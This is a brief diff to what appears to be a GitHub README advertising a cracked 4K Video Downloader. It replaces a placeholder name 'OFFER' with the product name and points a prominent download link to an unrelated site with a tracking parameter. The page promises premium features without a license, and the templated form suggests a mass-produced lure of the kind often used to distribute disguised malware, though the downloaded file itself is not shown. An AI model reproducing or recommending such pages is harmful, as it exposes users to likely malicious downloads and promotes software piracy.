@@ -7,7 +7,7 @@
 
 **[➤ Download 4k video downloader​ Free](https://wow-site.site/?label=e3a35746ef88ac29b19b4ae5fa48da10)**
 
-<code>This project provides a cracked version of OFFER​, enabling users to use the premium features without purchasing a license!</code>
+<code>This project provides a cracked version of 4k video downloader​, enabling users to use the premium features without purchasing a license!</code>
 
 ![4k video downloader](https://github.com/user-attachments/assets/df953021-4b31-4b7d-a469-0850315f8d96)
 
